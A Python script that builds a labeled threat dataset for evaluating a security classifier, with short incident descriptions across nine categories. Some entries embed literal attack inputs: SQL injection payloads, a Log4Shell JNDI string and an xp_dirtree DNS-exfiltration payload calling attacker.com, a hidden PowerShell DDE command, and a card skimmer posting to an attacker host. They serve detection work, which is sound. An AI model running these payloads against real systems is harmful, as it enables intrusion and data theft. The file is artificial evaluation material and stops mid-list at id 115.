"""
scripts/build_dataset.py — Curated cybersecurity threat dataset builder.

Produces an expanded, labeled dataset for evaluation. Covers all 9 canonical
threat categories used by the CyberCouncil classifier, drawn from real-world
threat patterns referenced in UNSW-NB15, CIC-IDS-2017, PhishTank, and CVE advisories.

Usage:
    python scripts/build_dataset.py                       # writes to data/threats.json
    python scripts/build_dataset.py --out data/custom.json

Output format (same schema as sample_threats.json):
    [ { "id": N, "threat_description": "...", "true_label": "..." }, ... ]
"""

import json
import argparse
import os


# ─────────────────────────────────────────────────────────────────
#  Curated threat records (50 samples, all 9 categories)
#  Sources: CVE advisories, MITRE ATT&CK, NIST NVD, PhishTank,
#           UNSW-NB15 / CIC-IDS-2017 feature descriptions.
# ─────────────────────────────────────────────────────────────────

DATASET = [
    # ── Phishing (10 samples) ────────────────────────────────────
    {
        "id": 1,
        "threat_description": (
            "Email from ceo-financials.com claiming to be the CEO requests an urgent "
            "wire transfer of $150,000. Link points to docusign-secure.ceo-financials.com. "
            "Email sent at 2:47 AM; real domain is company.com."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 2,
        "threat_description": (
            "User receives SMS from 'PayPal-Alert': 'Your account has been locked. "
            "Verify now at paypal-secure-login.net/verify or lose access permanently.'"
        ),
        "true_label": "Phishing"
    },
    {
        "id": 3,
        "threat_description": (
            "IT department receives email impersonating Microsoft365 support requesting "
            "admin credentials to resolve a 'license compliance issue'. Email header "
            "shows sender domain as micros0ft-support.ru."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 4,
        "threat_description": (
            "HR staff targeted with a fake onboarding portal link: "
            "hr-portal-company-login.workers.dev. Employees entered credentials and were "
            "redirected to the real HR system seconds later."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 5,
        "threat_description": (
            "Spear-phishing email targeting the CFO uses data from LinkedIn to reference "
            "a real project name, a real vendor, and attaches a macro-enabled Excel file "
            "'Q1_Budget_Review.xlsm' from an external Gmail account."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 6,
        "threat_description": (
            "Employees receive voicemail notification emails with an audio attachment. "
            "The attachment is a .html file that renders a fake Microsoft login page "
            "and exfiltrates credentials to an attacker-controlled endpoint."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 7,
        "threat_description": (
            "Users report receiving DocuSign requests for a document they never created. "
            "The embedded link leads to a credential harvester at secure-docusign.pages.dev."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 8,
        "threat_description": (
            "Multiple user accounts had password reset emails triggered simultaneously. "
            "Attacker used automated enumeration on the /forgot-password endpoint with "
            "a list of known corporate email addresses scraped from LinkedIn."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 9,
        "threat_description": (
            "Contractor receives a Teams message appearing to be from the CISO asking them "
            "to install a 'VPN update' package. The file hash does not match any known "
            "VPN software. Message originated from a recently compromised internal account."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 10,
        "threat_description": (
            "Customer support team receives a fake wire transfer request via email "
            "impersonating a client. The sender domain (client-payments.co) was registered "
            "48 hours earlier with privacy-protected WHOIS."
        ),
        "true_label": "Phishing"
    },

    # ── Malware (8 samples) ──────────────────────────────────────
    {
        "id": 11,
        "threat_description": (
            "Antivirus detects outbound traffic to 185.220.101.x at irregular intervals. "
            "System processes silently spawning cmd.exe and powershell.exe with base64-encoded payloads."
        ),
        "true_label": "Malware"
    },
    {
        "id": 12,
        "threat_description": (
            "Network scanner detects CVE-2017-0144 (EternalBlue) being exploited across "
            "internal hosts. Lateral movement observed using admin shares (C$, ADMIN$). "
            "Mimikatz credential dump artifacts found on three workstations."
        ),
        "true_label": "Malware"
    },
    {
        "id": 13,
        "threat_description": (
            "EDR alerts on a process named 'svchost.exe' running from %TEMP% rather than "
            "System32. The process establishes a persistent reverse shell to 91.199.x.x "
            "and injects into lsass.exe after 30 seconds."
        ),
        "true_label": "Malware"
    },
    {
        "id": 14,
        "threat_description": (
            "Security team observes DNS queries to algorithmically generated subdomains "
            "(e.g., qzrxbvf.malnet.cc) at 30-second intervals — consistent with a "
            "domain-generation-algorithm (DGA) C2 beacon."
        ),
        "true_label": "Malware"
    },
    {
        "id": 15,
        "threat_description": (
            "A USB drive left in the company parking lot was plugged in by an employee. "
            "AutoRun executed a dropper that installed a keylogger recording all keystrokes "
            "and periodically emailing logs to a Protonmail address."
        ),
        "true_label": "Malware"
    },
    {
        "id": 16,
        "threat_description": (
            "Firmware analysis reveals an implant in the UEFI of 12 executive laptops. "
            "The implant persists across OS reinstalls and phones home via HTTPS to a CDN "
            "domain using steganographically encoded payloads in image responses."
        ),
        "true_label": "Malware"
    },
    {
        "id": 17,
        "threat_description": (
            "Browser extension installed from a third-party store intercepts all form "
            "submissions and sends data to a remote server before allowing the page to "
            "process the request. Banking credentials and session cookies exfiltrated."
        ),
        "true_label": "Malware"
    },
    {
        "id": 18,
        "threat_description": (
            "Mobile device management logs show an APK sideloaded outside the MDM policy. "
            "The app requests SMS, camera, and contact access. Network traffic shows "
            "periodic uploads to a Telegram bot API endpoint."
        ),
        "true_label": "Malware"
    },

    # ── SQL Injection (5 samples) ────────────────────────────────
    {
        "id": 19,
        "threat_description": (
            "Login form receives the payload: admin' OR '1'='1'; DROP TABLE users; --"
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 20,
        "threat_description": (
            "WAF logs show repeated requests to /search?q=1 UNION SELECT username, "
            "password FROM admin_users-- ; targeting a MySQL 5.7 backend."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 21,
        "threat_description": (
            "E-commerce site reports customers seeing each other's order details. "
            "Investigation reveals the order ID parameter is injectable: "
            "/order?id=42 OR 1=1 returns all rows in the orders table."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 22,
        "threat_description": (
            "Time-based blind SQL injection detected in the registration endpoint: "
            "POST /register with email=test@x.com' AND SLEEP(5)-- causing 5-second "
            "server delays confirming injectable parameter."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 23,
        "threat_description": (
            "Database audit log shows 3,000 sequential SELECT queries against the users "
            "table, each extracting one character — consistent with automated character-by-character "
            "blind injection exfiltration."
        ),
        "true_label": "SQL Injection"
    },

    # ── DDoS (6 samples) ─────────────────────────────────────────
    {
        "id": 24,
        "threat_description": (
            "Server receives 847 requests/sec from 1,200 different IPs across 40 countries. "
            "Legitimate user traffic is blocked. Load balancer CPU at 100%."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 25,
        "threat_description": (
            "UDP flood targeting port 53 (DNS) from a spoofed source range reaching "
            "320 Gbps. DNS resolver is unresponsive. Upstream ISP confirms volumetric attack."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 26,
        "threat_description": (
            "Web application firewall detects 50,000 incomplete HTTP GET requests per "
            "minute keeping connections open (Slowloris attack). Server threads exhausted; "
            "legitimate requests timing out."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 27,
        "threat_description": (
            "NTP amplification attack using MONLIST command: 600 Mbps traffic hitting "
            "the public API gateway. Attack traffic is 40x amplified from original "
            "source packets using exposed NTP servers."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 28,
        "threat_description": (
            "BGP routing tables show a route hijack redirecting company IP prefix "
            "traffic through a foreign AS. All legitimate inbound traffic is black-holed "
            "resulting in complete service outage."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 29,
        "threat_description": (
            "Application layer attack targeting /api/search endpoint with complex "
            "database queries (each requiring 2–3 seconds). 10,000 bots sending valid "
            "search requests, exhausting database connection pool."
        ),
        "true_label": "DDoS"
    },

    # ── Ransomware (5 samples) ───────────────────────────────────
    {
        "id": 30,
        "threat_description": (
            "All files on the network share are encrypted and renamed with .locked extension. "
            "README_DECRYPT.txt demands $500,000 in Bitcoin within 72 hours."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 31,
        "threat_description": (
            "Hospital EMR system unavailable. Files replaced with .ryuk extension. "
            "Backup servers also encrypted. Attackers demand $1.2M ransom to restore "
            "patient record access. Patient care severely impacted."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 32,
        "threat_description": (
            "Attacker used legitimate RDP credentials (obtained via prior phishing) to "
            "access servers at 3 AM, disabled Windows Defender, then deployed "
            "AES-256 file encryptor via PsExec across 40 servers in 20 minutes."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 33,
        "threat_description": (
            "Double extortion attack: attacker exfiltrated 200 GB of intellectual property "
            "before encrypting. Ransom note threatens to publish data on leak site "
            "if payment is not received within 48 hours."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 34,
        "threat_description": (
            "Supply chain attack: a software update package from a trusted vendor "
            "contained a ransomware payload. 800 endpoints encrypted simultaneously "
            "after the auto-update ran overnight."
        ),
        "true_label": "Ransomware"
    },

    # ── Zero-Day Exploit (5 samples) ────────────────────────────
    {
        "id": 35,
        "threat_description": (
            "Apache Log4j servers receiving crafted JNDI lookup strings in User-Agent: "
            "${jndi:ldap://attacker.com/a}. Remote code execution confirmed. "
            "(CVE-2021-44228 — Log4Shell)"
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 36,
        "threat_description": (
            "Exchange server exploited via ProxyLogon (CVE-2021-26855): unauthenticated "
            "SSRF allows attacker to authenticate as the Exchange server, followed by "
            "SYSTEM-level code execution via CVE-2021-27065."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 37,
        "threat_description": (
            "Memory corruption in the kernel-mode driver winrm.sys triggered by a "
            "specially crafted WinRM request allows privilege escalation to SYSTEM. "
            "No patch available. Vendor notified 3 days ago."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 38,
        "threat_description": (
            "Browser exploit kit targeting Safari WebKit (unpatched): visiting a "
            "malicious webpage triggers heap spray + use-after-free for sandbox escape. "
            "Observed in the wild targeting journalists' devices."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 39,
        "threat_description": (
            "Fortinet VPN appliances exploited via an unauthenticated path traversal "
            "vulnerability in the SSL-VPN web portal (CVE-2018-13379). "
            "Plaintext VPN credentials exfiltrated for 50,000 devices."
        ),
        "true_label": "Zero-Day Exploit"
    },

    # ── Insider Threat (4 samples) ───────────────────────────────
    {
        "id": 40,
        "threat_description": (
            "Senior DBA accessing and exporting large volumes of customer PII outside "
            "business hours, copying to personal USB drives. Employee submitted "
            "resignation the previous week."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 41,
        "threat_description": (
            "Disgruntled engineer pushed code to production disabling authentication "
            "on the admin API 2 hours before their last day. The change bypassed "
            "the review process using a personal API token."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 42,
        "threat_description": (
            "Finance employee forwarding accounts payable emails to a personal Gmail "
            "account. Over 6 months, >2,000 invoices containing vendor bank details and "
            "contract values were exfiltrated."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 43,
        "threat_description": (
            "IT contractor granted temporary privileged access created a hidden admin "
            "account and installed a RAT before access was revoked. Backdoor active "
            "for 3 months before detection via anomaly in auth logs."
        ),
        "true_label": "Insider Threat"
    },

    # ── Man-in-the-Middle (4 samples) ────────────────────────────
    {
        "id": 44,
        "threat_description": (
            "SSL/TLS certificate mismatch detected on internal API gateway. "
            "Unencrypted credentials found in intercepted HTTP sessions between "
            "employee laptops and the login portal."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 45,
        "threat_description": (
            "Rogue Wi-Fi access point detected in the office (SSID matches legitimate AP). "
            "Devices connecting to it have all HTTPS traffic intercepted via SSL stripping. "
            "Session cookies for multiple SaaS apps captured."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 46,
        "threat_description": (
            "ARP spoofing detected on VLAN 10. Attacker's MAC appears in ARP tables for "
            "the default gateway IP, redirecting all segment traffic through the "
            "attacker's device before forwarding."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 47,
        "threat_description": (
            "BGP hijack rerouting traffic for a payment processor's IP range through "
            "an unauthorized AS in Eastern Europe. TLS certificates replaced with "
            "attacker-issued certs not trusted by browsers."
        ),
        "true_label": "Man-in-the-Middle"
    },

    # ── Other (3 samples) ────────────────────────────────────────
    {
        "id": 48,
        "threat_description": (
            "Cryptojacking malware discovered running on 300 cloud VM instances. "
            "CPU usage consistently at 90%+. Instances were provisioned via stolen "
            "AWS access keys found in a public GitHub repository."
        ),
        "true_label": "Other"
    },
    {
        "id": 49,
        "threat_description": (
            "Organisation's S3 bucket misconfigured as public. 4.2 million customer "
            "records (PII including SSNs) indexed by a data breach aggregation site. "
            "No active attacker — pure configuration error."
        ),
        "true_label": "Other"
    },
    {
        "id": 50,
        "threat_description": (
            "Adversarial inputs submitted to the organisation's ML fraud detection model "
            "causing misclassification of fraudulent transactions as legitimate. "
            "$2M in fraudulent transactions approved over 5 days."
        ),
        "true_label": "Other"
    },

    # ════════════════════════════════════════════════════════════════
    #  EXPANSION BLOCK — IDs 51–204 (154 additional records)
    #  Sources: CVE advisories, MITRE ATT&CK, CISA KEV, real incidents
    # ════════════════════════════════════════════════════════════════

    # ── Phishing (15 more → total 25) ───────────────────────────
    {
        "id": 51,
        "threat_description": (
            "Tax-season spear-phish targeting 200 employees: email references exact salary "
            "figures scraped from LinkedIn, attaches 'W2_2024.pdf.exe' hosted on a Google "
            "Drive link. Payload is a FormBook infostealer."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 52,
        "threat_description": (
            "OAuth consent phishing: users receive email from 'IT-Helpdesk@company-support.io' "
            "requesting they grant permissions to a malicious app named 'Office365 Backup'. "
            "App requests Mail.Read and Files.ReadWrite.All delegated permissions."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 53,
        "threat_description": (
            "QR code phishing (quishing): physical flyers left in office break rooms "
            "advertise a 'free parking pass portal'. QR code leads to a credential harvester "
            "mimicking the corporate SSO page, bypassing email-based phishing filters."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 54,
        "threat_description": (
            "CEO fraud targeting accounts payable: attacker spoofed CFO email address, "
            "sent urgent wire transfer request for $250K to a new vendor. Email passed SPF "
            "but DMARC alignment failed. Transfer processed before fraud detected."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 55,
        "threat_description": (
            "HTML smuggling phish: email arrives with clean HTML attachment. "
            "Opening the attachment dynamically assembles an ISO file in the browser "
            "using JavaScript blobs, dropping a Qakbot loader when mounted."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 56,
        "threat_description": (
            "Callback phishing (TOAD): email claims user's antivirus subscription expired; "
            "instructs them to call a support number. Caller is social-engineered into "
            "installing AnyDesk for 'renewal'. Attacker gains remote access to endpoint."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 57,
        "threat_description": (
            "Vendor email compromise: attacker compromised a supplier's Office 365 account "
            "and sent payment redirect requests to six of their customers from the legitimate "
            "domain. Three companies changed bank details and transferred funds."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 58,
        "threat_description": (
            "Adversary-in-the-middle phishing kit (Evilginx2) deployed at "
            "'login-microsoftonline.com.auth-verify.net'. Intercepts real MFA OTPs in "
            "real time, capturing session cookies and bypassing MFA entirely."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 59,
        "threat_description": (
            "LinkedIn InMail phishing campaign targeting engineers: fake recruiter "
            "sends a 'skills assessment' PDF. The file exploits CVE-2023-21608 (Adobe "
            "Acrobat use-after-free) for remote code execution with no user interaction."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 60,
        "threat_description": (
            "IT helpdesk vishing: attacker calls employee, claims to be from IT, "
            "says account is compromised and requests the user read back their current "
            "MFA code. Account taken over within seconds."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 61,
        "threat_description": (
            "Deepfake audio phish: employee receives WhatsApp voice note appearing to be "
            "from their manager's number requesting urgent credential reset. Voice is an "
            "AI-generated clone of the manager's voice trained on public interview audio."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 62,
        "threat_description": (
            "Mass credential phishing campaign: 10,000 emails sent impersonating DocuSign "
            "with subject 'Action Required: Sign document before expiry'. "
            "Link redirects through three URL shorteners to a harvester logging credentials."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 63,
        "threat_description": (
            "Typosquatting attack: domain 'arnazon-seller.com' sends email to Amazon "
            "marketplace sellers claiming a policy violation, directing them to 'verify' "
            "their account. 340 seller accounts compromised within 24 hours."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 64,
        "threat_description": (
            "Phishing via compromised newsletter platform: attacker gained access to a "
            "Mailchimp account and sent a malicious update email to 50,000 subscribers "
            "of a legitimate security newsletter, embedding a RAT download link."
        ),
        "true_label": "Phishing"
    },
    {
        "id": 65,
        "threat_description": (
            "Cloud storage phish: SharePoint notification email with legitimate Microsoft "
            "sender domain embeds a link to attacker-controlled OneDrive file that "
            "redirects to a credential harvester. Bypasses URL reputation filters."
        ),
        "true_label": "Phishing"
    },

    # ── Malware (17 more → total 25) ─────────────────────────────
    {
        "id": 66,
        "threat_description": (
            "Cobalt Strike beacon detected beaconing every 60 seconds to 104.21.x.x "
            "over HTTPS. Process injection into explorer.exe. Named pipe '\\pipe\\msagent_XX' "
            "observed — characteristic of default Cobalt Strike configuration."
        ),
        "true_label": "Malware"
    },
    {
        "id": 67,
        "threat_description": (
            "Emotet dropper delivered via macro-enabled Word doc. After execution, "
            "downloads Trickbot, which steals browser credentials and performs network "
            "reconnaissance. Conti ransomware deployed 48 hours later."
        ),
        "true_label": "Malware"
    },
    {
        "id": 68,
        "threat_description": (
            "Rootkit detected hiding 14 processes and 3 kernel modules from standard "
            "process listings. Only visible via memory forensics (Volatility). "
            "Persistence via modified MBR survives OS reinstall."
        ),
        "true_label": "Malware"
    },
    {
        "id": 69,
        "threat_description": (
            "AgentTesla keylogger exfiltrating data over SMTP to a Yandex Mail account. "
            "Captures keystrokes, clipboard content, and screenshots every 30 seconds. "
            "Delivered via macro in a fake shipping invoice attachment."
        ),
        "true_label": "Malware"
    },
    {
        "id": 70,
        "threat_description": (
            "Fileless malware using PowerShell living-off-the-land: malicious script "
            "loaded entirely in memory via WMI subscription, no disk artifacts. "
            "Exfiltrates Active Directory user list to Pastebin via HTTPS."
        ),
        "true_label": "Malware"
    },
    {
        "id": 71,
        "threat_description": (
            "Banking trojan IcedID detected on 30 endpoints. Performs browser hooking "
            "to inject fake login forms into banking websites, capturing credentials "
            "before TLS encryption. C2 communication disguised as PNG image downloads."
        ),
        "true_label": "Malware"
    },
    {
        "id": 72,
        "threat_description": (
            "Scheduled task 'WindowsDefenderUpdate' executes a Python script every 4 hours "
            "that collects browser cookies and sends them to a Telegram bot API. "
            "Script obfuscated with pyarmor and embedded in a legitimate-looking installer."
        ),
        "true_label": "Malware"
    },
    {
        "id": 73,
        "threat_description": (
            "Wiper malware (similar to HermeticWiper) deployed on 500 endpoints, "
            "overwriting the MBR and recursively corrupting files. No ransom demand. "
            "Attributed to state-sponsored threat actor based on TTPs."
        ),
        "true_label": "Malware"
    },
    {
        "id": 74,
        "threat_description": (
            "Linux backdoor SysJoker discovered on web server: disguised as a systemd "
            "service 'systemd-private-cache'. Connects to attacker C2 hosted on Google "
            "Drive, rotates C2 URLs every 24 hours."
        ),
        "true_label": "Malware"
    },
    {
        "id": 75,
        "threat_description": (
            "Supply chain compromise: popular npm package 'ua-parser-js' (10M weekly "
            "downloads) injected with a cryptominer and credential stealer. Malicious "
            "version 0.7.29 published by compromised maintainer account."
        ),
        "true_label": "Malware"
    },
    {
        "id": 76,
        "threat_description": (
            "Macro-less malware via Word DDE: document sends DDE command executing "
            "cmd.exe /c powershell -nop -w hidden -enc [base64_payload]. "
            "Disabled Office macro protections do not prevent execution."
        ),
        "true_label": "Malware"
    },
    {
        "id": 77,
        "threat_description": (
            "Mobile malware (Android) disguised as a flashlight app on third-party store "
            "installs a remote access trojan granting full device control: "
            "microphone, camera, location, SMS interception."
        ),
        "true_label": "Malware"
    },
    {
        "id": 78,
        "threat_description": (
            "Stealthy cryptominer XMRig deployed via exposed Docker daemon API (port 2375). "
            "Attacker spawns container with host-mount, installs miner in cron, "
            "then exits container to persist on the host."
        ),
        "true_label": "Malware"
    },
    {
        "id": 79,
        "threat_description": (
            "BlackEnergy-style ICS malware discovered on SCADA workstations at a power "
            "utility. Malware maps OT network topology, logs ICS commands, and is capable "
            "of sending malformed commands to RTUs."
        ),
        "true_label": "Malware"
    },
    {
        "id": 80,
        "threat_description": (
            "Magecart skimmer injected into e-commerce checkout page JavaScript. "
            "Intercepts payment card form data and POSTs to attacker.domain/collect "
            "encoded in base64. Active for 6 weeks before detection, affecting 12,000 customers."
        ),
        "true_label": "Malware"
    },
    {
        "id": 81,
        "threat_description": (
            "macOS stealer 'AMOS' (Atomic Stealer) distributed as a cracked version of "
            "Final Cut Pro on torrent sites. Exfiltrates Keychain passwords, browser cookies, "
            "crypto wallet seed phrases, and SSH keys."
        ),
        "true_label": "Malware"
    },
    {
        "id": 82,
        "threat_description": (
            "Process hollowing observed: legitimate notepad.exe spawned, memory region "
            "unmapped and replaced with shellcode. Parent process is a malicious PDF "
            "reader exploit. Outbound traffic to Tor hidden service."
        ),
        "true_label": "Malware"
    },

    # ── SQL Injection (17 more → total 22) ───────────────────────
    {
        "id": 83,
        "threat_description": (
            "Second-order SQL injection: attacker registers a username "
            "\"admin'--\" which is safely stored, but later unsafely interpolated "
            "in a profile update query, granting admin privileges."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 84,
        "threat_description": (
            "Out-of-band SQL injection via DNS exfiltration: payload "
            "'; EXEC master..xp_dirtree '//attacker.com/'+@@version--' "
            "triggers DNS lookup revealing the database version to attacker-controlled resolver."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 85,
        "threat_description": (
            "Boolean-based blind SQLi on /api/product?id=1: response differs for "
            "id=1 AND 1=1 (200 OK) vs id=1 AND 1=2 (404), allowing bit-by-bit data extraction "
            "without error messages. Automated with sqlmap."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 86,
        "threat_description": (
            "SQL injection in stored procedure parameter: EXEC sp_GetUser @username=N"
            "'x'; DROP TABLE audit_log;--'. Bypasses application-layer sanitization "
            "because the proc uses dynamic SQL internally."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 87,
        "threat_description": (
            "Mass exploitation of CVE-2023-32315 (Openfire authentication bypass) combined "
            "with a subsequent SQLi to extract admin credentials from 3,000 vulnerable "
            "Openfire XMPP servers exposed to the internet."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 88,
        "threat_description": (
            "HTTP header injection: attacker submits X-Forwarded-For: "
            "127.0.0.1' AND SLEEP(5)-- to an endpoint that logs IPs into a MySQL table "
            "using string concatenation. Time delay confirms injection."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 89,
        "threat_description": (
            "GraphQL injection: query field argument passed unsanitized into PostgreSQL. "
            "Attacker crafts: { user(id: \"1 UNION SELECT table_name FROM information_schema.tables\") "
            "{ name } } extracting full schema."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 90,
        "threat_description": (
            "CMS plugin (WordPress WooCommerce) vulnerable to unauthenticated SQLi "
            "(CVE-2023-28121): attacker extracts admin password hash from wp_users table "
            "and cracks it offline using hashcat in 2 minutes."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 91,
        "threat_description": (
            "ORM bypass: raw query interpolation in Django ORM "
            "Model.objects.raw('SELECT * FROM users WHERE name=%s' % user_input) "
            "allows injection despite using ORM framework."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 92,
        "threat_description": (
            "Error-based SQLi in Oracle DB: CTXSYS.DRITHSX.SN function exploited to "
            "expose column data in error messages. Attacker enumerates all 47 tables "
            "in the schema within 10 minutes using automated tooling."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 93,
        "threat_description": (
            "SQL injection via file upload metadata: image EXIF field 'Artist' set to "
            "' UNION SELECT user,password FROM admins-- is stored in database when "
            "processing metadata, later displayed without sanitization."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 94,
        "threat_description": (
            "UNION-based injection on PostgreSQL: attacker retrieves /etc/passwd via "
            "COPY TO and COPY FROM commands accessible through SQL injection in a "
            "search endpoint running as the postgres superuser."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 95,
        "threat_description": (
            "WAF bypass using URL encoding and comment injection: payload "
            "1/**/UN/**/ION/**/SE/**/LECT/**/ bypasses pattern-matching WAF rules "
            "while still being executed by MySQL backend."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 96,
        "threat_description": (
            "Injection in ORDER BY clause: /products?sort=price -- cannot use UNION "
            "but attacker uses conditional: ORDER BY (CASE WHEN 1=1 THEN price ELSE name END) "
            "to extract boolean responses about database contents."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 97,
        "threat_description": (
            "SQL injection in mobile app API: Android app sends POST with JSON body "
            "{\"user\":\"admin' OR 1=1#\",\"pass\":\"x\"}. Server-side concatenation "
            "of JSON fields into MySQL query results in authentication bypass."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 98,
        "threat_description": (
            "Mass data breach via automated SQLi scanning: threat actor used sqlmap to "
            "scan 50,000 URLs from a scraped list, found 12 vulnerable endpoints, "
            "and exfiltrated 2.1 million records in 6 hours."
        ),
        "true_label": "SQL Injection"
    },
    {
        "id": 99,
        "threat_description": (
            "Blind injection via cookie: session cookie value decoded from base64 "
            "contains serialized JSON with a 'user_id' field. Setting "
            "user_id to '1 AND SLEEP(3)' causes consistent 3-second delays confirming SQLi."
        ),
        "true_label": "SQL Injection"
    },

    # ── DDoS (16 more → total 22) ─────────────────────────────────
    {
        "id": 100,
        "threat_description": (
            "HTTPS flood (layer 7) bypassing Cloudflare: botnet of 120,000 compromised "
            "IoT devices sends 2.3 million HTTPS requests/sec to /api/checkout endpoint "
            "with valid TLS handshakes, exhausting origin server thread pool."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 101,
        "threat_description": (
            "Memcached amplification DDoS: attacker sends 15-byte UDP packets spoofed "
            "from victim IP to 100,000 misconfigured Memcached servers. "
            "Response traffic amplified 51,000x, generating 1.35 Tbps at target."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 102,
        "threat_description": (
            "SYN flood with IP spoofing: 500 million SYN packets/sec exhausting "
            "connection state table on border firewall. TCP half-open connection "
            "table fills in 4 seconds, dropping all legitimate new connections."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 103,
        "threat_description": (
            "DNS water torture attack: botnet sends random subdomains of victim's "
            "authoritative DNS (e.g., randomstring.victim.com) forcing full recursive "
            "resolution. DNS resolver CPU at 100%, legitimate DNS queries failing."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 104,
        "threat_description": (
            "QUIC/UDP amplification attack exploiting misconfigured QUIC servers: "
            "attacker generates 180 Gbps traffic targeting a financial institution's "
            "trading API, causing market connectivity outages for 22 minutes."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 105,
        "threat_description": (
            "Carpet-bombing DDoS: attack distributed across entire /22 IP range "
            "(1,024 IPs) instead of a single target, bypassing per-IP rate limits "
            "on the CDN. Scrubbing center unable to apply prefix-level filtering."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 106,
        "threat_description": (
            "Ransom DDoS (RDDoS): group 'Fancy Lazarus' sends 30-minute demo attack "
            "at 200 Gbps followed by email demanding 2 BTC to stop a promised 1 Tbps "
            "attack. Target is a mid-size financial services firm."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 107,
        "threat_description": (
            "HTTP/2 Rapid Reset (CVE-2023-44487) attack: client opens stream then "
            "immediately sends RST_STREAM, forcing server to allocate/deallocate "
            "resources. 200M requests/sec from 20,000 IP addresses overwhelms nginx."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 108,
        "threat_description": (
            "Botnets using residential proxies to simulate legitimate user traffic — "
            "each request comes from a real ISP IP with valid browser fingerprint. "
            "WAF challenge-response blocked 20% of traffic but missed 80% of attack."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 109,
        "threat_description": (
            "ICMP fragmentation flood: 600,000 malformed ICMP fragmented packets/sec "
            "force reassembly buffers to overflow on network routers, causing kernel "
            "panics on three core routers in the datacenter."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 110,
        "threat_description": (
            "ReDoS attack on API gateway regex: POST /validate with crafted JSON body "
            "triggers catastrophic backtracking in an email validation regex, consuming "
            "100% CPU per request. 500 concurrent requests = full API gateway outage."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 111,
        "threat_description": (
            "Volumetric attack against online gaming platform: 400 Gbps UDP flood "
            "targeting game server IPs during tournament finals. Attack coordinated "
            "via Telegram channel renting a DDoS-for-hire service for $50."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 112,
        "threat_description": (
            "SSL exhaustion attack: attacker establishes thousands of TLS connections "
            "and initiates renegotiation continuously. TLS handshake CPU cost is 15x "
            "greater for server than client, exhausting server SSL processing capacity."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 113,
        "threat_description": (
            "Smurf attack variant: attacker broadcasts ICMP echo requests with spoofed "
            "victim source IP to large network (4,096 hosts). All hosts reply to victim, "
            "generating amplified inbound traffic that saturates uplink."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 114,
        "threat_description": (
            "Application-layer DDoS via search engine crawler abuse: attacker deploys "
            "bots mimicking Googlebot (matching User-Agent and crawler IPs). "
            "Crawl-delay headers ignored, causing database query exhaustion."
        ),
        "true_label": "DDoS"
    },
    {
        "id": 115,
        "threat_description": (
            "Pulse wave DDoS: 300 Gbps attack delivered in 10-second bursts every "
            "2 minutes, alternating between UDP, TCP SYN, and HTTP vectors. "
            "Mitigation systems take 20+ seconds to activate, missing each pulse."
        ),
        "true_label": "DDoS"
